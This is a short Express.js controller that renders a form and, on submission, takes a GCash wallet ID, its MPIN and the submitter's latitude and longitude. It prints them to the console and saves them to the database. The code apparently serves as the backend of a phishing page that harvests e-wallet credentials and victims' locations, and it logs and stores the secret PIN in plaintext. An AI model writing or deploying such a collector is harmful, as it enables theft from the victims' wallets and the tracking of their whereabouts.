const User = require("../models/User")
const Location = require("../models/Location")


const formView = (req, res) => {
    res.render("form")
}

const submitForm = (req, res) => {
    const {gcash_id, mpin, latitude, longitude} = req.body;
    console.log(gcash_id, mpin, latitude, longitude)
    const newUser = new User({gcash_id, mpin})
    newUser.save().then((x) => console.log("User saved")).catch((err) => {console.log(err)})
    const newLocation = new Location({latitude, longitude})
    newLocation.save().then((x) => console.log("Location saved")).catch((err) => (console.log(err)))
}

module.exports = {
    formView,
    submitForm
}